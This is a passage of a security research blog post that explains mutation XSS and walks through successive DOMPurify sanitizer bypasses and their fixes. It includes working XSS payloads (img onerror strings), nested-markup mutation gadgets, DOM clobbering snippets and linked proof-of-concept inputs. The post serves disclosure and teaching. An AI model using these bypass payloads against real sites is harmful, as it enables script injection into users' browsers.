---
source: kevin-mizu
source_url: https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
title: "Exploring the DOMPurify library: Bypasses and Fixes (1/2) | mizu.re"
description: "Exploring the DOMPurify library: Bypasses and Fixes (1/2), Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML is parsed by the browser and common libraries., Explore how HTML"
---

_keyboard\_arrow\_up_

title: Exploring the DOMPurify library: Bypasses and Fixes (1/2)

date: Nov 17, 2024

tags: [Article](https://mizu.re/tag/Article) [Web](https://mizu.re/tag/Web) [mXSS](https://mizu.re/tag/mXSS)

# Exploring the DOMPurify library: Bypasses and Fixes (1/2)

- [📜 Introduction](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#introduction)
- [🔍 How does client-side HTML sanitizer works?](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#how-does-client-side-html-sanitizer-works)
- [❓ Why are mutation XSS (mXSS) possible?](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#why-are-mutation-xss-possible)
- [▶️ DOMPurify 3.1.0 bypass (found by @IceFont 👑)](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.0-bypass-found-by-IceFont)

  - [Node flattening](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#node-flattening)
  - [HTML Parsing states](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#html-parsing-states)
  - [Proof Of Concept](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-1)

- [⏩ DOMPurify 3.1.1 bypass](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.1-bypass)

  - [DOMPurify 3.1.0 fix](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.0-fix)
  - [DOM Clobbering issue](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dom-Clobbering-issue)
  - [Proof Of Concept](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-2)

- [⏭️ DOMPurify 3.1.2 bypass](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.2-bypass)

  - [DOMPurify 3.1.1 fix](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.1-fix)
  - [Second-order DOM Clobbering](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#second-order-dom-clobbering)
  - ["Elevator" HTML mutation](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#elevator-HTML-mutation)
  - [Proof Of Concept](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-3)

- [👨‍👩‍👧 DOMPurify Triple HTML Parsing bypass (found with @hash\_kitten and @ryotkak 🔥)](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-triple-html-Parsing-bypass-found-with-hash_kitten-and-ryotkak)

  - [Form reordering and node flattening](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#form-reordering-and-node-flattening)
  - [Proof Of Concept](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#proof-of-concept-4)

- [➡️ What's next?](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#what-next)

  - [DOMPurify 3.1.2 fix](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.2-fix)
  - [Conclusion](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#conclusion)

- [📚 Bibliography](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#bibliography)

## 📜 Introduction

This article will be part of a two-article series focusin📜 Introductionel free to skip to " [DOMPurify 3.1.0 bypass (found by @IceFont 👑)](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#dompurify-3.1.0-bypass-found-by-IceFont)".

## 🔍 How does client-side HTML sanitizer works?

Before diving into the technical details, I believe it's important to quickly explain how a client-side HTML sanitizer works.

Essentially, what you need to keep in mind is that using a client-side sanitizer leverages the browser's HTML parser, limiting the potential for parsing differentials to occur. For instance, using a client-side HTML sanitizer, by design, issues involving incorrect comment parsing won't have any impact, as the same HTML parser is used twice anyway.

```go
package main

import (
    "fmt"

    "github.com/microcosm-cc/bluemonday"
)

func main() {
    unsafeHTML := `<!--&gt;<img src=x onerror=alert()&gt;>`
    p := bluemonday.NewPolicy()
    p.AllowComments()
    safeHTML := p.Sanitize(unsafeHTML)
    fmt.Println("Sanitized HTML:", safeHTML) // <!--><img src=x onerror=alert()>-->
}
```

**Fig. 1**: Golang [bluemonday](https://github.com/microcosm-cc/bluemonday) HTML sanitizer bypass due to [inconsistent HTML comment parsing](https://github.com/microcosm-cc/bluemonday/releases/tag/v1.0.20) in [x/net/html](https://pkg.go.dev/golang.org/x/net/html) found by [@gregxsunday](https://x.com/gregxsunday) ( [ref](https://www.youtube.com/watch?v=H1TVk3HhL9E)).

_If you want to easily reproduce this issue on your side, you can use [pybluemonday](https://github.com/ColdHeat/pybluemonday) version <= 0.0.9, which contains all the vulnerable versions for this issue._

As an example of how internally a client-side HTML sanitizer works, here is a simplified version of the DOMPurify's workflow, as it is the subject of this article :)

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify.png)

**Fig. 2**: Simplified DOMPurify execution flow.

1. [**\_initDocument**](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L855C9-L855C22): Uses the [DOMParser API](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) to parse the HTML as the browser would.
2. [**\_createNodeIterator**](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L930): Uses [NodeIterator](https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator) to iterate over the DOM tree.
3. [**\_sanitizeElements**](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L1003): Checks for DOM Clobbering, mXSS, etc., and ensures the current tag is allowed.
4. [**\_sanitizeShadowDOM**](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L1384): The [NodeIterator](https://developer.mozilla.org/en-US/docs/Web/API/NodeIterator) API doesn't iterate over the <template> tag by default. Recursively sanitizes when it reaches a [DocumentFragment](https://developer.mozilla.org/en-US/docs/Web/API/DocumentFragment).
5. [**\_sanitizeAttributes**](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L1247): Sanitizes HTML attributes using DOM APIs.
6. [**body.innerHTML**](https://github.com/cure53/DOMPurify/blob/69c8c12940dbf98aef5f44eea77151e1aef532dc/src/purify.js#L1570): Serializes the clean HTML output and returns it.

_This is a highly simplified version of DOMPurify's logic. I recommend reading the code directly if you want to understand all its security measures._

## ❓ Why are mutation XSS (mXSS) possible?

Based on the previous section, you might be thinking:

> How could a client-side sanitizer be bypassed if it has the same parser as the browser?

That's a good point, and it is mostly due to the way HTML works. The first reason, as well explained in the specification, is that parsing an HTML string twice can lead to different outputs each time.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-parsing.png)

**Fig. 3**: HTML Specification - Serialising html fragments ( [ref](https://html.spec.whatwg.org/#serialising-html-fragments)).

A "well-known" example used by [@SecurityMB](https://x.com/SecurityMB) to bypass [DOMPurify < 2.0.17](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/) is related to the <form> child restriction, which blocks it from having another nested <form>:

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-form.png)

**Fig. 4**: HTML Specification - The form element ( [ref](https://html.spec.whatwg.org/#the-form-element)).

Dom-Explorer

**Fig. 5**: Double parsing mutation using <form> element's parsing properties.

_You can manually edit the string at the top, and the result will appear at the bottom. It uses 'pipelines', meaning that here, we see the result of double HTML parsing using the DOMParser method. Thanks to [@BitK\_](https://x.com/BitK_) for this excellent interactive DOM Tree rendering tool ( [link](https://yeswehack.github.io/Dom-Explorer/))._

Additionally, when parsing an HTML DOM tree from a string, there are several rules that describe how each tag has to be interpreted. Among these rules described in the [HTML specification](https://html.spec.whatwg.org/), some are related to the concept of namespace.

- <html> \| [HTML namespace](https://html.spec.whatwg.org/)
- <svg> \| [SVG namespace](https://www.w3.org/TR/SVG2/)
- <math> \| [MathML namespace](https://www.w3.org/TR/MathML/chapter2.xml)

Each of these namespaces has its own parsing rules, meaning that a tag, depending on its context, can be interpreted in completely different ways. This is one of the key reasons that makes HTML sanitization complicated, even on the client side.

For example, the <style> element is treated as text in the HTML namespace, while within the MathML or SVG namespace, it would be treated as HTML.

Dom-Explorer

**Fig. 6**: Parsing of the <style> element in the HTML namespace.

Dom-Explorer

**Fig. 7**: Parsing of the <style> element in the SVG namespace.

The above two behaviors are also used with [HTML integration points](https://html.spec.whatwg.org/#html-integration-point) and [MathML text integration points](https://html.spec.whatwg.org/#html-integration-point) to switch from the SVG and MathML namespace to the HTML one.

List of [MathML text integration points](https://html.spec.whatwg.org/#html-integration-point):

- <mi>
- <mo>
- <mn>
- <ms>
- <mtext>

List of [HTML integration points](https://html.spec.whatwg.org/#html-integration-point):

- <annotation-xml>
- <foreignObject>
- <desc>
- <title>

Dom-Explorer

**Fig. 8**: Example of HTML integration points usage.

Many more advanced mutation techniques have already been discovered and documented by great researchers. Since explaining every existing mutation and their potential dangers would take too long, I recommend checking out these resources if you haven't already (I'm probably missing a lot of great ones):

| Author | Ressource |
| --- | --- |
| [@cure53berlin](https://x.com/cure53berlin) | [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations](https://cure53.de/fp170.pdf). |
| [@Checkmarx](https://x.com/Checkmarx) | [Mutation Cross-Site Scripting (mXSS) Vulnerabilities Discovered in Mozilla-Bleach](https://checkmarx.com/blog/vulnerabilities-discovered-in-mozilla-bleach/). |
| [@garethheyes](https://twitter.com/garethheyes) | [Bypassing DOMPurify again with mutation XSS](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss). |
| [@klikkioy](https://x.com/klikkioy) | [Yahoo Mail stored XSS](https://klikki.fi/yahoo-mail-stored-xss/). |
| [@LiveOverflow](https://x.com/liveoverflow) | [Generic HTML Sanitizer Bypass Investigation](https://www.youtube.com/watch?v=HUtkW2gjC8Q). |
| [@LiveOverflow](https://x.com/liveoverflow) | [XSS on Google Search - Sanitizing HTML in The Client?](https://www.youtube.com/watch?v=lG7U3fuNw3A) |
| [@SecurityMB](https://x.com/SecurityMB) | [Write-up of DOMPurify 2.0.0 bypass using mutation XSS](https://research.securitum.com/dompurify-bypass-using-mxss/). |
| [@SecurityMB](https://x.com/SecurityMB) | [Mutation XSS via namespace confusion - DOMPurify < 2.0.17 bypass](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/). |
| [@SecurityMB](https://x.com/SecurityMB) | [invalid parsing of HTML by tree\_builder\_simulator leading to mutation XSS (Chromium)](https://issues.chromium.org/issues/40056601). |
| [@SecurityMB](https://x.com/SecurityMB) | [Sanitizer bypass if the sanitized markup is assigned to srcdoc (Firefox)](https://bugzilla.mozilla.org/show_bug.cgi?id=1669945). |
| [@ryotkak](https://x.com/ryotkak) | [Bypassing DOMPurify with good old XML](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/). |
| [@gregxsunday](https://x.com/gregxsunday) | [$3,133.70 XSS in golang's net/html library - My first Google bug bounty](https://www.youtube.com/watch?v=H1TVk3HhL9E). |
| [@Sonar\_Research](https://x.com/Sonar_Research) | [mXSS cheatsheet](https://sonarsource.github.io/mxss-cheatsheet/). |
| [@S1r1u5\_](https://x.com/S1r1u5_) | [MXSS Explained: Server Side HTML Sanitizers are Doomed to Fail with this XSS!](https://www.youtube.com/watch?v=aczTceXp49U). |
| [@S1r1u5\_](https://x.com/S1r1u5_) | [MXSS Evolution and Timeline](https://github.com/msrkp/MXSS). |
| [@wir3less2](https://x.com/wir3less2) | [XSS in Gmail's Amp4Email](https://www.adico.me/post/xss-in-gmail-s-amp4email) |
| [Me](https://x.com/kevin_mizu) | [Playing with DOMPurify custom elements handling](https://mizu.re/post/playing-with-dompurify-ce-handling). |

Now that we have all the necessary information to understand the upcoming sections, let's start discussing the bypasses.

## DOMPurify 3.1.0 bypass (found by @IceFont 👑)

### A bit of context on recent DOMPurify researches

The story begins on April 26, 2024, when [@cure53berlin](https://x.com/cure53berlin) posted about a full DOMPurify bypass in versions <= 3.1.0, discovered by [@IcesFont](https://x.com/IcesFont).

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/twitter-cure53-310.png)

**Fig. 9**: Tweet announcing the DOMPurify <= 3.1.0 bypass ( [ref](https://x.com/cure53berlin/status/1783819608127840678)).

This bypass involved a lot of new mutation concepts, making it really hard to replicate. Thankfully, [@IcesFont](https://x.com/IcesFont) graciously gave me more details about how his bypass worked, which greatly helped my understanding ❤️

I really want to highlight that it’s thanks to [@IcesFont](https://x.com/IcesFont)'s work that I was able to find bypasses in versions 3.1.1 and 3.1.2.

With that said, we can dive into how [@IcesFont](https://x.com/IcesFont) bypassed DOMPurify <= 3.1.0 in default configurations :D

### Node flattening

When parsing an HTML tree, there are many factors to consider. One aspect that might not immediately come to mind is **how deep a DOM tree can be**? Interestingly, the HTML specification does not provide explicit guidelines on how this should be handled.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/flattening.png)

**Fig. 10**: HTML Specification - Tree construction ( [ref](https://html.spec.whatwg.org/#tree-construction)).

Because of this, each HTML parsing implementation can define its own limit and act differently when reaching it, which significantly increases the risk of parsing discrepancies.

| Language | Library | Nested node limit | Handling |
| --- | --- | --- | --- |
| Chromium | [DOMParser](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) | 512 | Flattening |
| Firefox | [DOMParser](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) | 512 | Flattening |
| Safari | [DOMParser](https://developer.mozilla.org/en-US/docs/Web/API/DOMParser) | 512 | Flattening |
| Ruby | [nokogiri](https://nokogiri.org/index.html) (updated version of [libxml2](https://github.com/GNOME/libxml2)) | 256 | Removing |
| C | [libxml2](https://github.com/GNOME/libxml2) | 255 | Removing |
| PHP | [php-xml](https://www.php.net/manual/en/class.domdocument.php) ( [libxml2](https://github.com/GNOME/libxml2)) | 255 | Removing |
| Python | [lxml](https://lxml.de/) ( [libxml2](https://github.com/GNOME/libxml2)) | 255 | Removing |
| Python | [html.parser](https://docs.python.org/3/library/html.parser.html) | No limit? | - |
| javascript | [parse5](https://www.npmjs.com/package/parse5) | No limit? | - |
| javascript | [htmlparser2](https://www.npmjs.com/package/htmlparser2) | No limit? | - |
| Golang | [x/net/html](https://pkg.go.dev/golang.org/x/net/html) | No limit? | - |
| Rust | [html5ever](https://docs.rs/html5ever/latest/html5ever/) | No limit? | - |
| Java | [Jsoup](https://jsoup.org/) | No limit? | - |
| Perl | [HTML::TreeBuilder](https://metacpan.org/pod/HTML::TreeBuilder) | No limit? | - |

**Fig. 11**: Handling of nested node limits depending on HTML parsers.

For instance, this is how your browser is currently handling it: (If I'm not mistaken and this hasn't changed, the output should be different. If not, please DM me on Twitter)

Dom-Explorer

**Fig. 12**: Nested nodes with a depth of 511.

Dom-Explorer

**Fig. 13**: Nested nodes with a depth of 512.

Something that makes this behavior even more interesting for mXSS is related to the timing of when this mutation occurs. As we can see from the live examples above, even the <style> tag is flattened out of the <svg> tag, it remains part of the SVG namespace.

This strongly indicates that the flattening occurs after the node has been parsed. As a result, it's possible to create an "invalid" HTML DOM tree, which would lead to another mutation if it is serialized and parsed again.

For example, if an <a> tag is a child of another <a> tag within the HTML namespace, it gets popped out. However, if we flatten an <a> tag from the SVG namespace into the HTML namespace, it won't get popped out!

Dom-Explorer

<a><a>​

html

### Dom Tree

**Fig. 14**: Nested <a> without flattening.

Dom-Explorer

<div\*509><a><svg><a>​

html

### Dom Tree

<BODY

>

xhtml

<DIV

x509

>

xhtml

<A

>

xhtml

<svg

>

svg

<a

>

svg

**Fig. 15**: Nested <a> with flattening.

Being able to return "invalid" HTML out of a sanitizer is a **strong** mutation gadget, as most of the time it will result in a mutation when reparsing it.

### HTML Parsing states

The last piece requires a deep understanding of how HTML parse states are handled. For this bypass, we are going to focus on two concepts: [HTML insertion modes](https://html.spec.whatwg.org/#the-insertion-mode) and the [stack of open elements](https://html.spec.whatwg.org/#the-stack-of-open-elements). As explained in the HTML specification, [HTML insertion modes](https://html.spec.whatwg.org/#the-insertion-mode) aim to define how tokens are processed while parsing an HTML string.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-insertion-modes.png)

**Fig. 16**: HTML Specification - The insertion mode ( [ref](https://html.spec.whatwg.org/#the-insertion-mode))

For instance, based on the [in caption insertion mode](https://html.spec.whatwg.org/#parsing-main-incaption) definition, if the parser finds a <caption> start tag, it needs to **pop elements** from the **stack of open elements** until a <caption> element has been popped out.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-in-caption.png)

**Fig. 17**: HTML Specification - Parsing main incaption ( [ref](https://html.spec.whatwg.org/#parsing-main-incaption)).

> What is the stack of open elements?

Essentially, it's a LIFO (Last In First Out) stack of HTML elements. This stack grows as the HTML parser processes the provided string.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-stack-of-open-elements.png)

**Fig. 18**: HTML Specification - The stack of open elements ( [ref](https://html.spec.whatwg.org/#the-stack-of-open-elements)).

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/stack-of-open-elements-example.png)

**Fig. 19**: Example of stack of open elements for a caption element.

If we revisit the [in caption insertion mode](https://html.spec.whatwg.org/#parsing-main-incaption): popping out elements from the [stack of open elements](https://html.spec.whatwg.org/#the-stack-of-open-elements) until finding a <caption> element will result in popping out all elements below the nested <caption> element (even if they are valid in that context :D).

Dom-Explorer

<table><caption><div>before</div><caption></caption><div>after</div></caption></table>​

html

### Dom Tree

<BODY

>

xhtml

<DIV

>

xhtml

#text

```
after
```

<TABLE

>

xhtml

#text

```

```

<CAPTION

>

xhtml

#text

```

```

<DIV

>

xhtml

#text

```
before
```

#text

```

```

<CAPTION

>

xhtml

#text

```

```

**Fig. 20**: Example of in caption handling in the case of nested <caption>.

What makes it even more interesting is that, even if this is HTML namespace specific, it doesn't take into account the namespace of the tag that gets popped out as they are part of the [stack of open elements](https://html.spec.whatwg.org/#the-stack-of-open-elements).

Dom-Explorer

<table><caption><svg><title><caption></caption></title><style><a id="</style><imgsrc=xonerror=alert()>"></a></style></svg></caption></table>​

html

### Dom Tree

<BODY

>

xhtml

<IMG

src=x

onerror=alert()

>

xhtml

#text

```
">
```

<TABLE

>

xhtml

#text

```

```

<CAPTION

>

xhtml

#text

```

```

<svg

>

svg

#text

```

```

<title

>

svg

#text

```

```

<CAPTION

>

xhtml

#text

```

```

<STYLE

>

xhtml

#text

```
<a id="
```

#text

```

```

**Fig. 21**: Example of in caption handling in the case of nested <caption> with nested SVG namespace elements.

Finally, to generate this situation using node flattening, [@IcesFont](https://x.com/IcesFont) used the fact that the in caption insertion mode falls back to the in body insertion mode, which "resets" the parent in table insertion mode.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/html-spec-in-body.png)

**Fig. 22**: HTML Specification - Parsing main incaption ( [ref](https://html.spec.whatwg.org/#parsing-main-incaption)).

Because of that, it is possible to get a valid context where <caption> can be nested, allowing for the creation of the above "invalid" situation using flattening :D

Dom-Explorer

<table><caption><table><caption>​

html

### Dom Tree

<BODY

>

xhtml

<TABLE

>

xhtml

<CAPTION

>

xhtml

<TABLE

>

xhtml

<CAPTION

>

xhtml

**Fig. 23**: Parsing of nested <caption> using the in table insertion mode without flattening.

Dom-Explorer

<div\*508><table><caption><table><caption>​

html

### Dom Tree

<BODY

>

xhtml

<DIV

x508

>

xhtml

<TABLE

>

xhtml

<CAPTION

>

xhtml

<TABLE

>

xhtml

<CAPTION

>

xhtml

**Fig. 24**: Parsing of nested <caption> using the in table insertion mode with flattening.

### Proof Of Concept

If we bring everything that has been explained in this section together, it is possible to craft the following HTML payload, which bypasses DOMPurify version <= 3.1.0 ️‍🔥

_Unfortunately, Firefox does not mutate when a <table> is present at the same level as the second <caption> tag, making Firefox not vulnerable to this mutation. However, [@kinugawamasato](https://x.com/kinugawamasato) discovered another mutation using deep nesting, which works on Firefox, Chromium, and Safari (we won't cover that one here)._

[![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.0-bypass.png)](https://yeswehack.github.io/Dom-Explorer/dom-explorer/frame/?input=editable&titleBar=readonly&readonly=true&pipe[titleBar]=true&pipe[settings]=true&pipe[render]=true&pipe[skip]=true/#eyJpbnB1dCI6IjxkaXYqNTA2PlxuPHRhYmxlPlxuICA8Y2FwdGlvbj5cbiAgICA8c3ZnPlxuICAgICAgPHRpdGxlPlxuICAgICAgICA8dGFibGU+PGNhcHRpb24+PC9jYXB0aW9uPjwvdGFibGU+XG4gICAgICA8L3RpdGxlPlxuICAgICAgPHN0eWxlPjxhIGlkPVwiPC9zdHlsZT48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoKT5cIj48L2E+PC9zdHlsZT5cbiAgICA8L3N2Zz5cbiAgPC9jYXB0aW9uPlxuPC90YWJsZT4iLCJwaXBlbGluZXMiOlt7ImlkIjoiMGFkcXN1YWoiLCJuYW1lIjoiRG9tIFRyZWUiLCJwaXBlcyI6W3sibmFtZSI6IkRvbVB1cmlmeSIsImlkIjoiZXJsNXR6ZXMiLCJoaWRlIjp0cnVlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ2ZXJzaW9uIjoiMy4xLjAiLCJvcHRpb25zIjoie30ifX0seyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJiNTRyd2RiNSIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ==)

**Fig. 25**: DOMPurify <= 3.1.0 bypass found by [@IcesFont](https://x.com/IcesFont).

## ⏩ DOMPurify 3.1.1 bypass

### DOMPurify 3.1.0 fix

This issue has been fixed by [@cure53berlin](https://x.com/cure53berlin) with the help of [@IcesFont](https://x.com/IcesFont) using a custom depth counter to limit the maximum nested depth to 255. Why not use a browser API to get the current depth of a node? Because there is no such API :(

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.1-fix.png)

**Fig. 26**: GitHub diff between DOMPurify versions 3.1.1 and 3.1.0 ( [ref](https://github.com/cure53/DOMPurify/compare/3.1.0...3.1.1)).

"Basically", the fix will use a custom node attribute (\_\_depth) taken from the parentNode and adds 1 (the \_\_removalCount is used when removing nodes to properly track the depth update). Then, if the attribute's value gets bigger than 255, it removes the node and all its children.

Additionally, to make sure that the \_\_depth attribute doesn't get clobbered using <form><input id="\_\_depth">, the \_isClobbered function has been updated to enforce it to be an integer.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.1-fix-2.png)

**Fig. 27**: DOMPurify's 3.1.1 [\_isClobbered](https://github.com/cure53/DOMPurify/blob/7a0a984a8aea7341ce084f72cda806e2395b336b/src/purify.js#L937) function.

### DOM Clobbering issue

Even if the fix might look great at first glance, a small mistake has been made regarding how the .parentNode property is accessed. In the fix, currentNode.parentNode.\_\_depth is being used. Why is this a problem? Essentially, it allows clobbering the parentNode property with a node that doesn't have the \_\_depth property yet, allowing the count to reset!

```html
<div id="parent">
    <form id="f">
        <input name="parentNode">
    </form>
</div>
<script>
    parent.__depth = 250;
    f.parentNode.__depth; // undefined
</script>
```

**Fig. 28**: Example of \_\_depth clobbering through the .parentNode property.

Using this bug twice in a row is required for the fix, as 255 \* 2 = 510, which doesn't reach the flattening limit. This can be done by using the nested <form> mutation described in the " [Why are mutation XSS (mXSS) possible?"](https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes#why-are-mutation-xss-possible) section.

### Proof Of Concept

_For the same reason as the previous bypass, this one isn't working in Firefox._

[![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.1-bypass.png)](https://yeswehack.github.io/Dom-Explorer/dom-explorer/#eyJpbnB1dCI6IjxkaXYqMjAwPlxuPGZvcm0+PGlucHV0IG5hbWU9XCJwYXJlbnROb2RlXCI+XG48ZGl2KjIwMD5cbjxmb3JtPjwvZm9ybT48Zm9ybT48aW5wdXQgbmFtZT1cInBhcmVudE5vZGVcIj5cbjxkaXYqMTA1PlxuPHRhYmxlPlxuICA8Y2FwdGlvbj5cbiAgICA8c3ZnPlxuICAgICAgPGRlc2M+XG4gICAgICAgIDx0YWJsZT48Y2FwdGlvbj48L2NhcHRpb24+PC90YWJsZT5cbiAgICAgIDwvZGVzYz5cbiAgICAgIDxzdHlsZT48YSB0aXRsZT1cIjwvc3ZnPjwvc3R5bGU+PGltZyBzcmMgb25lcnJvcj1hbGVydCgxKT5cIj48L2E+PC9zdHlsZT5cbiAgICAgIDwvc3ZnPlxuICA8L2NhcHRpb24+XG48L3RhYmxlPiIsInBpcGVsaW5lcyI6W3siaWQiOiIwYWRxc3VhaiIsIm5hbWUiOiJEb20gVHJlZSIsInBpcGVzIjpbeyJuYW1lIjoiRG9tUHVyaWZ5IiwiaWQiOiJlcmw1dHplcyIsImhpZGUiOnRydWUsInNraXAiOmZhbHNlLCJvcHRzIjp7InZlcnNpb24iOiIzLjEuMSIsIm9wdGlvbnMiOiJ7fSJ9fSx7Im5hbWUiOiJEb21QYXJzZXIiLCJpZCI6ImI1NHJ3ZGI1IiwiaGlkZSI6ZmFsc2UsInNraXAiOmZhbHNlLCJvcHRzIjp7InR5cGUiOiJ0ZXh0L2h0bWwiLCJzZWxlY3RvciI6ImJvZHkiLCJvdXRwdXQiOiJpbm5lckhUTUwiLCJhZGREb2N0eXBlIjp0cnVlfX1dfV19)

**Fig. 29**: DOMPurify <= 3.1.1 bypass.

## ⏭️ DOMPurify 3.1.2 bypass

### DOMPurify 3.1.1 fix

The fix in this version was much stricter than the previous one, not only because of my report but also because [@hash\_kitten](https://x.com/hash_kitten) found another full bypass involving only [HTML insertion modes](https://html.spec.whatwg.org/#the-insertion-mode) and the [stack of open elements](https://html.spec.whatwg.org/#the-stack-of-open-elements). We aren't going to cover this bypass in this article, but it motivated [@cure53berlin](https://x.com/cure53berlin) to block every [HTML integration point](https://html.spec.whatwg.org/#html-integration-point), preventing any switch from the SVG to HTML namespace.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.2-fix.png)

**Fig. 30**: GitHub diff between DOMPurify versions 3.1.2 and 3.1.1 ( [ref](https://github.com/cure53/DOMPurify/compare/3.1.1...3.1.2)).

Additionally, to make sure no DOM Clobbering issues were left, the [getParentNode](https://github.com/cure53/DOMPurify/blob/5b2e3171e403535656270e3aa1842ff030f136e4/src/purify.js#L120) method was used, which resolves the value using the property getter itself.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify-3.1.2-fix-2.png)

**Fig. 31**: GitHub diff between DOMPurify versions 3.1.2 and 3.1.1 ( [ref](https://github.com/cure53/DOMPurify/compare/3.1.1...3.1.2)).

### Second-order DOM Clobbering

This time, the DOM Clobbering issue was inherent to the sanitization order used by DOMPurify. If we refer back to the previous sanitization flow graph, DOM Clobbering checks occur within the [\_sanitizeElement](https://github.com/cure53/DOMPurify/blob/5b2e3171e403535656270e3aa1842ff030f136e4/src/purify.js#L994) function.

![](https://mizu.re/articles/articles/vuln06_dompurify/article01/images/dompurify.png)

**Fig. 32**: Simplified DOMPurify execution flow.

This means that any attribute modification or normalization occurring after the [\_sanitizeElement](https://github.com/cure53/DOMPurify/blob/5b2e3171e403535656270e3aa1842ff030f136e4/src/purify.js#L994) function might create a "second-order" DOM Clobbering.

```html
<form id="x"></form>
<input form="y" name="z">
<script>
    console.log(x.z); // undefined
    x.id = "y";
    console.log(y.z); // <input form="y" name="z">
</script>
```

**Fig. 33**: Second order DOM Clobbering example 1.

```html
<form id="x">
    <input id="i" form="y" name="z">
</form>
<script>
    console.log(x.z); // undefined
    i.removeAttribute("form");
    console.log(x.z); // <input form="y" name="z">
</script>
```

**Fig. 34**: Second order DOM Clobbering example 2 (this one was found by [@ryotkak](https://x.com/ryotkak)).

If we take a look at the [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/5b2e3171e403535656270e3aa1842ff030f136e4/src/purify.js#L1238) function, we can see that it:

1. Takes the current attribute value.
2. Trims it (removes spaces).
3. Sanitizes it.
4. Sets the clean value in place of the previous one.

```js
const _sanitizeAttributes = function (currentNode) {
    // ...
    const { attributes } = currentNode;
    // ...
    while (l--) {
        const attr = attributes[l];
        // ...
        stringTrim(attrValue);
        // Sanitize
        try {
            // ...
            currentNode.setAttribute(name, value);
            // ...
        } catch (_) {}
    }
};
```

**Fig. 35**: Simplified DOMPurify [\_sanitizeAttributes](https://github.com/cure53/DOMPurify/blob/5b2e3171e403535656270e3aa1842ff030f136e4/src/purify.js#L1238) function.

As an example:

Dom-Explorer

<divid="a "></a>​

html

### Dom Tree

DomPurify3.1.2

<Empty String>

**Fig. 36**: Example of DOMPurify attribute normalization.

Because of that we can now clobber the \_\_depth attribute itself, allowing us to break the depth count at the beginning!

```html
<form id="x "></form>
<input form="x" name="__depth">
<script>
f = document.getElementById("x ");
f.setAttribute("id", f.id.trim());
